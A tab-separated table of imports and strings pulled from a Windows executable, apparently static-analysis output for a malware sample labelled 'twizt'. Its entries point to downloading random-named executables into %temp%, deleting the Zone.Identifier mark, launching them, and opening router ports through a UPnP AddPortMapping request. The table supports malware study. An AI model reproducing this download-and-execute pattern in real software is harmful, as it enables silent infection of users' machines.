reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x409550	0x40f118	import	0x409540	KERNEL32.dll.EnterCriticalSection
0x40955d	0x409577	string	0x409540	hL9A
0x40957c	0x40f10c	import	0x409540	KERNEL32.dll.LeaveCriticalSection
0x409599	0x40f118	import	0x409590	KERNEL32.dll.EnterCriticalSection
0x4095ba	0x4095e4	string	0x409590	hL9A
0x4095e0	0x4095e4	string	0x409590	hL9A
0x4095e9	0x40f10c	import	0x409590	KERNEL32.dll.LeaveCriticalSection
0x40960b	0x40f108	import	0x409600	KERNEL32.dll.InitializeCriticalSection
0x40965d	0x40f110	import	0x409600	KERNEL32.dll.CreateFileW
0x40967e	0x40f11c	import	0x409600	KERNEL32.dll.CreateFileMappingW
0x40969d	0x40f0fc	import	0x409600	KERNEL32.dll.MapViewOfFile
0x4096b2	0x40f0f8	import	0x409600	KERNEL32.dll.GetFileSize
0x409718	0x40f100	import	0x409600	KERNEL32.dll.UnmapViewOfFile
0x409722	0x40f120	import	0x409600	KERNEL32.dll.CloseHandle
0x40972c	0x40f120	import	0x409600	KERNEL32.dll.CloseHandle
0x4097c7	0x40ffbc	string	0x409780	twizt)
0x4097cc	0x40f0cc	import	0x409780	KERNEL32.dll.lstrlenA
0x4097d3	0x40ffc4	string	0x409780	twizt)
0x409a09	0x40ffcc	string	0x4099f0	twizt)
0x409a0e	0x40f0cc	import	0x4099f0	KERNEL32.dll.lstrlenA
0x409a15	0x40ffd4	string	0x4099f0	twizt)
0x40a143	0x40f00c	import	0x40a130	ADVAPI32.dll.CryptAcquireContextW
0x40a159	0x40f004	import	0x40a130	ADVAPI32.dll.CryptGenRandom
0x40a165	0x40f008	import	0x40a130	ADVAPI32.dll.CryptReleaseContext
0x40ab5e	0x40f0cc	import	0x40ab50	KERNEL32.dll.lstrlenA
0x40ab7d	0x40f0ec	import	0x40ab50	KERNEL32.dll.MultiByteToWideChar
0x40abc5	0x40f0cc	import	0x40abb0	KERNEL32.dll.lstrlenA
0x40ac17	0x40f0cc	import	0x40ac00	KERNEL32.dll.lstrlenA
0x40ace5	0x40f0cc	import	0x40acd0	KERNEL32.dll.lstrlenA
0x40ad72	0x40f1b4	import	0x40ad40	USER32.dll.wvsprintfA
0x40aedf	0x40f21c	import	0x40aec0	WS2_32.dll.send
0x40af92	0x40f0d8	import	0x40af80	KERNEL32.dll.GetTickCount
0x40afb8	0x40f214	import	0x40af80	WS2_32.dll.ioctlsocket
0x40afef	0x40f220	import	0x40af80	WS2_32.dll.recv
0x40b004	0x40f0d8	import	0x40af80	KERNEL32.dll.GetTickCount
0x40b024	0x40f0e0	import	0x40af80	KERNEL32.dll.Sleep
0x40b02a	0x40f0d8	import	0x40af80	KERNEL32.dll.GetTickCount
0x40b063	0x40f250	import	0x40b050	WS2_32.dll.socket
0x40b095	0x40f244	import	0x40b050	WS2_32.dll.htons
0x40b0af	0x40f238	import	0x40b050	WS2_32.dll.connect
0x40b14c	0x40f04c	import	0x40b140	KERNEL32.dll.InterlockedExchangeAdd
0x40b181	0x40f050	import	0x40b140	KERNEL32.dll.InterlockedIncrement
0x40b284	0x40f05c	import	0x40b140	KERNEL32.dll.InterlockedDecrement
0x40b30c	0x40f058	import	0x40b2e0	KERNEL32.dll.WaitForSingleObject
0x40b3ef	0x40f050	import	0x40b390	KERNEL32.dll.InterlockedIncrement
0x40b422	0x40f05c	import	0x40b390	KERNEL32.dll.InterlockedDecrement
0x40b50f	0x40f058	import	0x40b4e0	KERNEL32.dll.WaitForSingleObject
0x40b54e	0x40f108	import	0x40b530	KERNEL32.dll.InitializeCriticalSection
0x40b5a0	0x40f058	import	0x40b560	KERNEL32.dll.WaitForSingleObject
0x40b5b9	0x40f120	import	0x40b560	KERNEL32.dll.CloseHandle
0x40b604	0x40f118	import	0x40b5e0	KERNEL32.dll.EnterCriticalSection
0x40b65f	0x40f08c	import	0x40b5e0	KERNEL32.dll.CreateThread
0x40b69c	0x40f048	import	0x40b5e0	KERNEL32.dll.GetCurrentProcess
0x40b6a7	0x40f048	import	0x40b5e0	KERNEL32.dll.GetCurrentProcess
0x40b6ae	0x40f034	import	0x40b5e0	KERNEL32.dll.DuplicateHandle
0x40b6c2	0x40f10c	import	0x40b5e0	KERNEL32.dll.LeaveCriticalSection
0x40b6d6	0x40f044	import	0x40b6d0	KERNEL32.dll.GetCurrentThread
0x40b6dd	0x40f03c	import	0x40b6d0	KERNEL32.dll.GetThreadPriority
0x40b6e8	0x40f044	import	0x40b6d0	KERNEL32.dll.GetCurrentThread
0x40b6ef	0x40f040	import	0x40b6d0	KERNEL32.dll.SetThreadPriority
0x40b712	0x40f04c	import	0x40b6d0	KERNEL32.dll.InterlockedExchangeAdd
0x40b747	0x40f118	import	0x40b6d0	KERNEL32.dll.EnterCriticalSection
0x40b792	0x40f058	import	0x40b6d0	KERNEL32.dll.WaitForSingleObject
0x40b7ae	0x40f10c	import	0x40b6d0	KERNEL32.dll.LeaveCriticalSection
0x40b7de	0x40f0e0	import	0x40b6d0	KERNEL32.dll.Sleep
0x40b7ed	0x40f044	import	0x40b6d0	KERNEL32.dll.GetCurrentThread
0x40b7f4	0x40f040	import	0x40b6d0	KERNEL32.dll.SetThreadPriority
0x40b829	0x40f118	import	0x40b810	KERNEL32.dll.EnterCriticalSection
0x40b858	0x40f120	import	0x40b810	KERNEL32.dll.CloseHandle
0x40b867	0x40f10c	import	0x40b810	KERNEL32.dll.LeaveCriticalSection
0x40b874	0x40f038	import	0x40b810	KERNEL32.dll.DeleteCriticalSection
0x40b8aa	0x40f2ac	import	0x40b8a0	ntdll.dll.NtQuerySystemTime
0x40b8b8	0x40f2a8	import	0x40b8a0	ntdll.dll.RtlTimeToSecondsSince1980
0x40b97e	0x40f04c	import	0x40b950	KERNEL32.dll.InterlockedExchangeAdd
0x40b9c8	0x40f058	import	0x40b950	KERNEL32.dll.WaitForSingleObject
0x40ba16	0x40ba31	string	0x40b9f0	_^[]
0x40ba20	0x40f058	import	0x40b9f0	KERNEL32.dll.WaitForSingleObject
0x40ba6e	0x40f14c	import	0x40ba40	OLEAUT32.dll.SysReAllocString
0x40ba96	0x40f2d4	import	0x40ba40	ole32.dll.CoCreateInstance
0x40bb31	0x40f150	import	0x40ba40	OLEAUT32.dll.SysStringLen
0x40bbfb	0x40f0c0	import	0x40bb50	KERNEL32.dll.lstrcmpiW
0x40bc0f	0x40f150	import	0x40bb50	OLEAUT32.dll.SysStringLen
0x40bd18	0x40f1fc	import	0x40bca0	WININET.dll.InternetCrackUrlA
0x40bd28	0x40f1e8	import	0x40bca0	WININET.dll.InternetOpenA
0x40bd61	0x40f1f8	import	0x40bca0	WININET.dll.InternetConnectA
0x40bd97	0x40f1f4	import	0x40bca0	WININET.dll.HttpOpenRequestA
0x40bdbf	0x40f1ec	import	0x40bca0	WININET.dll.HttpSendRequestA
0x40be08	0x40f1d8	import	0x40bca0	WININET.dll.InternetReadFile
0x40be97	0x40f1e4	import	0x40bca0	WININET.dll.InternetCloseHandle
0x40bea4	0x40f1e4	import	0x40bca0	WININET.dll.InternetCloseHandle
0x40beb1	0x40f1e4	import	0x40bca0	WININET.dll.InternetCloseHandle
0x40bf1e	0x40f204	import	0x40bed0	WS2_32.dll.recvfrom
0x40bf2e	0x40f0e0	import	0x40bed0	KERNEL32.dll.Sleep
0x40bf3f	0x40f4c8	string	0x40bed0	HTTP/1.1 200 OK
0x40bf4b	0x40f178	import	0x40bed0	SHLWAPI.dll.StrCmpNIA
0x40bf55	0x40f4d8	string	0x40bed0	LOCATION:
0x40bf61	0x40f174	import	0x40bed0	SHLWAPI.dll.StrStrIA
0x40bf8e	0x40f170	import	0x40bed0	SHLWAPI.dll.StrChrA
0x40bfda	0x40f250	import	0x40bfc0	WS2_32.dll.socket
0x40c010	0x40f244	import	0x40bfc0	WS2_32.dll.htons
0x40c01a	0x40f4e4	string	0x40bfc0	239.255.255.250
0x40c01f	0x40f240	import	0x40bfc0	WS2_32.dll.inet_addr
0x40c03d	0x40f208	import	0x40bfc0	WS2_32.dll.setsockopt
0x40c073	0x40f210	import	0x40bfc0	WS2_32.dll.bind
0x40c079	0x40f500	string	0x40bfc0	M-SEARCH * HTTP/1.1\r\nST:urn:schemas-upnp-org:device:InternetGatewayDevice:1\r\nMX: 3\r\nMan:"ssdp:discover"\r\nHOST: 239.255.255.250:1900\r\n\r\n
0x40c08c	0x40f0cc	import	0x40bfc0	KERNEL32.dll.lstrlenA
0x40c09b	0x40f20c	import	0x40bfc0	WS2_32.dll.sendto
0x40c0b5	0x40f214	import	0x40bfc0	WS2_32.dll.ioctlsocket
0x40c1f3	0x40f588	string	0x40c140	service
0x40c1fc	0x40f0c0	import	0x40c140	KERNEL32.dll.lstrcmpiW
0x40c206	0x40f598	string	0x40c140	serviceType
0x40c24b	0x40f0c0	import	0x40c140	KERNEL32.dll.lstrcmpiW
0x40c25f	0x40f150	import	0x40c140	OLEAUT32.dll.SysStringLen
0x40c277	0x40f150	import	0x40c140	OLEAUT32.dll.SysStringLen
0x40c2ad	0x40f5b0	string	0x40c2a0	serviceList
0x40c3d3	0x40f5c8	string	0x40c320	device
0x40c3dc	0x40f0c0	import	0x40c320	KERNEL32.dll.lstrcmpiW
0x40c3e6	0x40f5d8	string	0x40c320	deviceType
0x40c42b	0x40f0c0	import	0x40c320	KERNEL32.dll.lstrcmpiW
0x40c43f	0x40f150	import	0x40c320	OLEAUT32.dll.SysStringLen
0x40c457	0x40f150	import	0x40c320	OLEAUT32.dll.SysStringLen
0x40c48d	0x40f5f0	string	0x40c480	deviceList
0x40c50d	0x40f608	string	0x40c500	urn:schemas-upnp-org:device:InternetGatewayDevice:1
0x40c52b	0x40f670	string	0x40c500	urn:schemas-upnp-org:device:WANDevice:1
0x40c549	0x40f6c0	string	0x40c500	urn:schemas-upnp-org:device:WANConnectionDevice:1
0x40c567	0x40f760	string	0x40c500	urn:schemas-upnp-org:service:WANIPConnection:1
0x40c581	0x40f7c0	string	0x40c500	urn:schemas-upnp-org:service:WANPPPConnection:1
0x40c59b	0x40f820	string	0x40c500	controlURL
0x40c62d	0x40f838	string	0x40c620	URLBase
0x40c736	0x40f848	string	0x40c670	%S%S
0x40c74b	0x40f150	import	0x40c670	OLEAUT32.dll.SysStringLen
0x40c755	0x40f150	import	0x40c670	OLEAUT32.dll.SysStringLen
0x40c818	0x40f1fc	import	0x40c7a0	WININET.dll.InternetCrackUrlA
0x40c826	0x40f850	string	0x40c7a0	Mozilla/4.0 (compatible; UPnP/1.0; Windows 9x)
0x40c82b	0x40f1e8	import	0x40c7a0	WININET.dll.InternetOpenA
0x40c864	0x40f1f8	import	0x40c7a0	WININET.dll.InternetConnectA
0x40c88e	0x40f880	string	0x40c7a0	POST
0x40c89a	0x40f1f4	import	0x40c7a0	WININET.dll.HttpOpenRequestA
0x40c8c5	0x40f1f0	import	0x40c7a0	WININET.dll.HttpAddRequestHeadersA
0x40c8cb	0x40f888	string	0x40c7a0	Content-Type: text/xml; charset="utf-8"\r\nConnection: Close\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n
0x40c8ef	0x40f1ec	import	0x40c7a0	WININET.dll.HttpSendRequestA
0x40c92e	0x40f1d8	import	0x40c7a0	WININET.dll.InternetReadFile
0x40c9b1	0x40f1e4	import	0x40c7a0	WININET.dll.InternetCloseHandle
0x40c9be	0x40f1e4	import	0x40c7a0	WININET.dll.InternetCloseHandle
0x40c9cb	0x40f1e4	import	0x40c7a0	WININET.dll.InternetCloseHandle
0x40c9e6	0x40faa0	string	0x40c9e0	<?xml version="1.0"?>\r\n<SOAP-ENV:Envelope\r\n xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"\r\n SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">\r\n<SOAP-ENV:Body>\r\n<m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1">\r\n<NewRemoteHost></NewRemoteHost>\r\n<NewExternalPort>%d</NewExternalPort>\r\n<NewProtocol>%s</NewProtocol>\r\n<NewInternalPort>%d</NewInternalPort>\r\n<NewInternalClient>%s</NewInternalClient>\r\n<NewEnabled>1</NewEnabled>\r\n<NewPortMappingDescription></NewPortMappingDescription>\r\n<NewLeaseDuration>0</NewLeaseDuration>\r\n</m:AddPortMapping>\r\n</SOAP-ENV:Body>\r\n</SOAP-ENV:Envelope>\r\n\r\n
0x40ca29	0x40fd28	string	0x40c9e0	SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"
0x40ca6a	0x40f2d0	import	0x40ca60	ole32.dll.CoInitializeEx
0x40cb43	0x40f030	import	0x40cb30	KERNEL32.dll.GetLocaleInfoA
0x40cbe0	0x40f110	import	0x40cbc0	KERNEL32.dll.CreateFileW
0x40cbf5	0x40f0f8	import	0x40cbc0	KERNEL32.dll.GetFileSize
0x40cc02	0x40f120	import	0x40cbc0	KERNEL32.dll.CloseHandle
0x40cc44	0x40f110	import	0x40cc10	KERNEL32.dll.CreateFileW
0x40cc65	0x40f11c	import	0x40cc10	KERNEL32.dll.CreateFileMappingW
0x40cc84	0x40f0fc	import	0x40cc10	KERNEL32.dll.MapViewOfFile
0x40cc9d	0x40f0f8	import	0x40cc10	KERNEL32.dll.GetFileSize
0x40cd49	0x40f100	import	0x40cc10	KERNEL32.dll.UnmapViewOfFile
0x40cd53	0x40f120	import	0x40cc10	KERNEL32.dll.CloseHandle
0x40cd5d	0x40f120	import	0x40cc10	KERNEL32.dll.CloseHandle
0x40cd7c	0x40f110	import	0x40cc10	KERNEL32.dll.CreateFileW
0x40cda1	0x40f104	import	0x40cc10	KERNEL32.dll.WriteFile
0x40cdab	0x40f120	import	0x40cc10	KERNEL32.dll.CloseHandle
0x40ce25	0x40f02c	import	0x40cdd0	KERNEL32.dll.CreateProcessW
0x40ce35	0x40f0e0	import	0x40cdd0	KERNEL32.dll.Sleep
0x40ce49	0x40f344	string	0x40cdd0	open
0x40ce50	0x40f158	import	0x40cdd0	SHELL32.dll.ShellExecuteW
0x40ce6a	0x40f0e0	import	0x40cdd0	KERNEL32.dll.Sleep
0x40ce89	0x40f0d8	import	0x40ce80	KERNEL32.dll.GetTickCount
0x40ceaf	0x40f0e0	import	0x40ce80	KERNEL32.dll.Sleep
0x40cec8	0x40f350	string	0x40ce80	%temp%
0x40cecd	0x40f088	import	0x40ce80	KERNEL32.dll.ExpandEnvironmentStringsW
0x40cf67	0x40f360	string	0x40ce80	%s\%d%d.exe
0x40cf73	0x40f1a0	import	0x40ce80	USER32.dll.wsprintfW
0x40cf84	0x40f378	string	0x40ce80	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
0x40cf89	0x40f1e0	import	0x40ce80	WININET.dll.InternetOpenW
0x40cfb8	0x40f1dc	import	0x40ce80	WININET.dll.InternetOpenUrlW
0x40cfe7	0x40f110	import	0x40ce80	KERNEL32.dll.CreateFileW
0x40d01a	0x40f1d8	import	0x40ce80	WININET.dll.InternetReadFile
0x40d04b	0x40f104	import	0x40ce80	KERNEL32.dll.WriteFile
0x40d05a	0x40f120	import	0x40ce80	KERNEL32.dll.CloseHandle
0x40d067	0x40f460	string	0x40ce80	%s:Zone.Identifier
0x40d073	0x40f1a0	import	0x40ce80	USER32.dll.wsprintfW
0x40d083	0x40f0b4	import	0x40ce80	KERNEL32.dll.DeleteFileW
0x40d0a4	0x40f0e0	import	0x40ce80	KERNEL32.dll.Sleep
0x40d0d1	0x40f0b4	import	0x40ce80	KERNEL32.dll.DeleteFileW
0x40d0de	0x40f120	import	0x40ce80	KERNEL32.dll.CloseHandle
0x40d0eb	0x40f1e4	import	0x40ce80	WININET.dll.InternetCloseHandle
0x40d0f8	0x40f1e4	import	0x40ce80	WININET.dll.InternetCloseHandle
0x40d103	0x40f0e0	import	0x40ce80	KERNEL32.dll.Sleep
0x40d12f	0x40f0e0	import	0x40ce80	KERNEL32.dll.Sleep
0x40d150	0x40f488	string	0x40ce80	%s\%d.exe
0x40d15c	0x40f1a0	import	0x40ce80	USER32.dll.wsprintfW
0x40d189	0x40f49c	string	0x40ce80	%s:Zone.Identifier
0x40d195	0x40f1a0	import	0x40ce80	USER32.dll.wsprintfW
0x40d1a5	0x40f0b4	import	0x40ce80	KERNEL32.dll.DeleteFileW
0x40d1c6	0x40f0e0	import	0x40ce80	KERNEL32.dll.Sleep
0x40d1e4	0x40f0b4	import	0x40ce80	KERNEL32.dll.DeleteFileW
0x40d228	0x40f094	import	0x40d1f0	KERNEL32.dll.CreateEventA
0x40d237	0x40f250	import	0x40d1f0	WS2_32.dll.socket
0x40d27a	0x40f244	import	0x40d1f0	WS2_32.dll.htons
0x40d29c	0x40f208	import	0x40d1f0	WS2_32.dll.setsockopt
0x40d2ad	0x40f210	import	0x40d1f0	WS2_32.dll.bind
0x40d2d5	0x40f08c	import	0x40d1f0	KERNEL32.dll.CreateThread
0x40d33b	0x40d328	string	0x40d2f0	9\bu\nf
0x40d44b	0x40f214	import	0x40d420	WS2_32.dll.ioctlsocket
0x40d4b8	0x40f204	import	0x40d420	WS2_32.dll.recvfrom
0x40d4ce	0x40f04c	import	0x40d420	KERNEL32.dll.InterlockedExchangeAdd
0x40d4ef	0x40f058	import	0x40d420	KERNEL32.dll.WaitForSingleObject
0x40d5a0	0x40f244	import	0x40d520	WS2_32.dll.htons
0x40d5c8	0x40f20c	import	0x40d520	WS2_32.dll.sendto
0x40d5dd	0x40f04c	import	0x40d520	KERNEL32.dll.InterlockedExchangeAdd
0x40d661	0x40f0a4	import	0x40d650	KERNEL32.dll.SetEvent
0x40d66d	0x40f058	import	0x40d650	KERNEL32.dll.WaitForSingleObject
0x40d677	0x40f120	import	0x40d650	KERNEL32.dll.CloseHandle
0x40d6e5	0x40f094	import	0x40d6c0	KERNEL32.dll.CreateEventA
0x40d6f4	0x40f250	import	0x40d6c0	WS2_32.dll.socket
0x40d735	0x40f210	import	0x40d6c0	WS2_32.dll.bind
0x40d761	0x40f08c	import	0x40d6c0	KERNEL32.dll.CreateThread
0x40d80a	0x40f118	import	0x40d800	KERNEL32.dll.EnterCriticalSection
0x40d82c	0x40f10c	import	0x40d800	KERNEL32.dll.LeaveCriticalSection
0x40d8fa	0x40f118	import	0x40d8e0	KERNEL32.dll.EnterCriticalSection
0x40d91e	0x40f10c	import	0x40d8e0	KERNEL32.dll.LeaveCriticalSection
0x40d967	0x40f26c	import	0x40d8e0	WS2_32.dll.getpeername
0x40d97b	0x40f0a0	import	0x40d8e0	KERNEL32.dll.CreateIoCompletionPort
0x40d990	0x40f054	import	0x40d8e0	KERNEL32.dll.InterlockedExchange
0x40d9b6	0x40f108	import	0x40d8e0	KERNEL32.dll.InitializeCriticalSection
0x40d9c0	0x40f050	import	0x40d8e0	KERNEL32.dll.InterlockedIncrement
0x40da0f	0x40f050	import	0x40d9f0	KERNEL32.dll.InterlockedIncrement
0x40da4a	0x40f118	import	0x40da30	KERNEL32.dll.EnterCriticalSection
0x40da76	0x40f05c	import	0x40da30	KERNEL32.dll.InterlockedDecrement
0x40da8e	0x40f04c	import	0x40da30	KERNEL32.dll.InterlockedExchangeAdd
0x40dabc	0x40f050	import	0x40da30	KERNEL32.dll.InterlockedIncrement
0x40dacc	0x40f05c	import	0x40da30	KERNEL32.dll.InterlockedDecrement
0x40dae4	0x40f10c	import	0x40da30	KERNEL32.dll.LeaveCriticalSection
0x40daee	0x40f0a4	import	0x40da30	KERNEL32.dll.SetEvent
0x40dafb	0x40f06c	import	0x40da30	KERNEL32.dll.PostQueuedCompletionStatus
0x40db2a	0x40f120	import	0x40da30	KERNEL32.dll.CloseHandle
0x40db40	0x40f224	import	0x40da30	WS2_32.dll.WSACloseEvent
0x40db56	0x40f038	import	0x40da30	KERNEL32.dll.DeleteCriticalSection
0x40dbe0	0x40f118	import	0x40dbd0	KERNEL32.dll.EnterCriticalSection
0x40dbf0	0x40f04c	import	0x40dbd0	KERNEL32.dll.InterlockedExchangeAdd
0x40dbfd	0x40f10c	import	0x40dbd0	KERNEL32.dll.LeaveCriticalSection
0x40dc38	0x40f10c	import	0x40dbd0	KERNEL32.dll.LeaveCriticalSection
0x40dc76	0x40f04c	import	0x40dc50	KERNEL32.dll.InterlockedExchangeAdd
0x40dce1	0x40f05c	import	0x40dc50	KERNEL32.dll.InterlockedDecrement
0x40dd5c	0x40f0d8	import	0x40dd50	KERNEL32.dll.GetTickCount
0x40dd6f	0x40f058	import	0x40dd50	KERNEL32.dll.WaitForSingleObject
0x40dd89	0x40f268	import	0x40dd50	WS2_32.dll.WSAWaitForMultipleEvents
0x40dda6	0x40f25c	import	0x40dd50	WS2_32.dll.WSAEnumNetworkEvents
0x40ddd8	0x40f270	import	0x40dd50	WS2_32.dll.accept
0x40de20	0x40f0d8	import	0x40dd50	KERNEL32.dll.GetTickCount
0x40de39	0x40f118	import	0x40dd50	KERNEL32.dll.EnterCriticalSection
0x40de5a	0x40f10c	import	0x40dd50	KERNEL32.dll.LeaveCriticalSection
0x40de6b	0x40f10c	import	0x40dd50	KERNEL32.dll.LeaveCriticalSection
0x40de82	0x40f118	import	0x40dd50	KERNEL32.dll.EnterCriticalSection
0x40de95	0x40f04c	import	0x40dd50	KERNEL32.dll.InterlockedExchangeAdd
0x40ded5	0x40f10c	import	0x40dd50	KERNEL32.dll.LeaveCriticalSection
0x40dedb	0x40f0d8	import	0x40dd50	KERNEL32.dll.GetTickCount
0x40deeb	0x40f058	import	0x40dd50	KERNEL32.dll.WaitForSingleObject
0x40df11	0x40f22c	import	0x40df10	WS2_32.dll.WSASend
0x40df42	0x40f230	import	0x40df10	WS2_32.dll.WSAGetLastError
0x40df58	0x40f0e0	import	0x40df10	KERNEL32.dll.Sleep
0x40e02d	0x40f118	import	0x40df90	KERNEL32.dll.EnterCriticalSection
0x40e050	0x40f10c	import	0x40df90	KERNEL32.dll.LeaveCriticalSection
0x40e08a	0x40f228	import	0x40e080	WS2_32.dll.WSARecv
0x40e0c0	0x40f230	import	0x40e080	WS2_32.dll.WSAGetLastError
0x40e0d6	0x40f0e0	import	0x40e080	KERNEL32.dll.Sleep
0x40e13d	0x40f04c	import	0x40e120	KERNEL32.dll.InterlockedExchangeAdd
0x40e16b	0x40f050	import	0x40e120	KERNEL32.dll.InterlockedIncrement
0x40e17d	0x40f05c	import	0x40e120	KERNEL32.dll.InterlockedDecrement
0x40e1b6	0x40f054	import	0x40e190	KERNEL32.dll.InterlockedExchange
0x40e1e0	0x40f05c	import	0x40e190	KERNEL32.dll.InterlockedDecrement
0x40e1f3	0x40f05c	import	0x40e190	KERNEL32.dll.InterlockedDecrement
0x40e204	0x40f04c	import	0x40e190	KERNEL32.dll.InterlockedExchangeAdd
0x40e28b	0x40f05c	import	0x40e190	KERNEL32.dll.InterlockedDecrement
0x40e2bb	0x40f05c	import	0x40e190	KERNEL32.dll.InterlockedDecrement
0x40e326	0x40f05c	import	0x40e190	KERNEL32.dll.InterlockedDecrement
0x40e35c	0x40f208	import	0x40e190	WS2_32.dll.setsockopt
0x40e369	0x40f254	import	0x40e190	WS2_32.dll.closesocket
0x40e473	0x40f068	import	0x40e450	KERNEL32.dll.GetSystemInfo
0x40e487	0x40f108	import	0x40e450	KERNEL32.dll.InitializeCriticalSection
0x40e495	0x40f094	import	0x40e450	KERNEL32.dll.CreateEventA
0x40e4ae	0x40f0a0	import	0x40e450	KERNEL32.dll.CreateIoCompletionPort
0x40e4db	0x40f27c	import	0x40e450	WS2_32.dll.WSASocketA
0x40e501	0x40f208	import	0x40e450	WS2_32.dll.setsockopt
0x40e531	0x40f244	import	0x40e450	WS2_32.dll.htons
0x40e547	0x40f210	import	0x40e450	WS2_32.dll.bind
0x40e55f	0x40f264	import	0x40e450	WS2_32.dll.listen
0x40e56a	0x40f278	import	0x40e450	WS2_32.dll.WSACreateEvent
0x40e57e	0x40f260	import	0x40e450	WS2_32.dll.WSAEventSelect
0x40e602	0x40f2e4	import	0x40e602	urlmon.dll.URLDownloadToFileW
0x40e608	0x40f2bc	import	0x40e608	ntdll.dll.isalpha
0x40e60e	0x40f2b8	import	0x40e60e	ntdll.dll.isdigit
0x40e614	0x40f2b4	import	0x40e614	ntdll.dll.memmove
0x40e61a	0x40f2a4	import	0x40e61a	ntdll.dll.mbstowcs
0x40e620	0x40f28c	import	0x40e620	msvcrt.dll._vscprintf
0x40e626	0x40f284	import	0x40e626	msvcrt.dll.rand
0x40e62c	0x40f288	import	0x40e62c	msvcrt.dll.srand
0x40e6f5	0x40e71a	string	0x40e63c	]_^[
0x40e703	0x40e71a	string	0x40e63c	]_^[
0x40e73e	0x40f2c8	import	0x40e73e	ntdll.dll.memset
0x40e744	0x40f2c4	import	0x40e744	ntdll.dll._aullshr
0x40e74a	0x40f2c0	import	0x40e74a	ntdll.dll._allshl
0x40e750	0x40f294	import	0x40e750	ntdll.dll.memcpy
0x40e756	0x40f298	import	0x40e756	ntdll.dll._chkstk
0x40e75c	0x40f29c	import	0x40e75c	ntdll.dll._aulldiv
0x40e76f	0x40e77c	string	0x40e764	]_^[
0x40e8b8	0x40e8c2	string	0x40e879	3҉U\b blocks=Basic Latin,Cyrillic
0x40ea53	0x40ea49	string	0x40e879	90t\bJ
0x40ea9c	0x40f2a0	import	0x40ea9c	ntdll.dll.RtlUnwind
0x40eaa2	0x40f2b0	import	0x40eaa2	ntdll.dll.NtQueryVirtualMemory
